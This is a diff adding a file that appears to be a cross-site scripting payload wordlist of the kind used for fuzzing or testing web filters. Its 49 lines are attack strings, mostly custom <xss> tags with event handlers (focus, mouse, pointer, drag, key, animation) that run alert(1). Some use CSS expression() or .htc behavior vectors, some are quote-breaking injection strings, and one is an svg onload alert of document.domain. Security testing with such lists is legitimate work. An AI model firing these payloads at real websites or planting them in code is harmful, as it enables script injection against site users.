@@ -1,0 +1,49 @@
+<xss id=x tabindex=1 onblur=alert(1)></xss><input autofocus>
+<xss id=x tabindex=1 onfocus=alert(1)></xss>
+<xss id=x tabindex=1 onfocusin=alert(1)></xss>
+<xss id=x tabindex=1 onfocusout=alert(1)></xss><input autofocus>
+<xss id=x tabindex=1 onactivate=alert(1)></xss>
+<xss onafterscriptexecute=alert(1)><script>1</script>
+<xss id=x tabindex=1 onbeforeactivate=alert(1)></xss>
+<xss id=x tabindex=1 onbeforedeactivate=alert(1)></xss><input autofocus>
+<xss onbeforescriptexecute=alert(1)><script>1</script>
+<xss id=x tabindex=1 ondeactivate=alert(1)></xss><input id=y autofocus>
+<xss onclick="alert(1)">test</xss>
+<xss oncontextmenu="alert(1)">test</xss>
+<xss oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<xss oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<xss ondblclick="alert(1)" autofocus tabindex=1>test</xss>
+<xss draggable="true" ondrag="alert(1)">test</xss>
+<xss draggable="true" ondragend="alert(1)">test</xss>
+<xss draggable="true" ondragenter="alert(1)">test</xss>
+<xss draggable="true" ondragleave="alert(1)">test</xss>
+<xss draggable="true" ondragstart="alert(1)">test</xss>
+<xss onkeydown="alert(1)" contenteditable>test</xss>
+<xss onkeypress="alert(1)" contenteditable>test</xss>
+<xss onkeyup="alert(1)" contenteditable>test</xss>
+<xss onmousedown="alert(1)">test</xss>
+<xss onmouseenter="alert(1)">test</xss>
+<xss onmouseleave="alert(1)">test</xss>
+<xss onmousemove="alert(1)">test</xss>
+<xss onmouseout="alert(1)">test</xss>
+<xss onmouseover="alert(1)">test</xss>
+<xss onmouseup="alert(1)">test</xss>
+<xss onmousewheel=alert(1)>   //requires scrolling
+<xss onpointerdown=alert(1)>XSS</xss>
+<xss onpointerenter=alert(1)>XSS</xss>
+<xss onpointerleave=alert(1)>XSS</xss>
+<xss onpointermove=alert(1)>XSS</xss>
+<xss onpointerout=alert(1)>XSS</xss>
+<xss onpointerover=alert(1)>XSS</xss>
+<xss onpointerrawupdate=alert(1)>XSS</xss>
+<xss onpointerup=alert(1)>XSS</xss>
+<xss class=progress-bar-animated onanimationstart=alert(1)>
+<xss class="carousel slide" data-ride=carousel data-interval=100 ontransitionend=alert(1)><xss class=carousel-inner><xss class="carousel-item active"></xss><xss class=carousel-item></xss></xss></xss>
+<XSS STYLE="behavior: url(%(htc)s);">
+<XSS STYLE="xss:expression(javascript:alert(1))">
+'';!--"<XSS>=&{()}
+\";alert('XSS');//
+xss"><!--><svg/onload=alert(document.domain)>
+<XSS STYLE="xss:expression(alert('XSS'))">
+<XSS STYLE="behavior: url(xss.htc);">
+
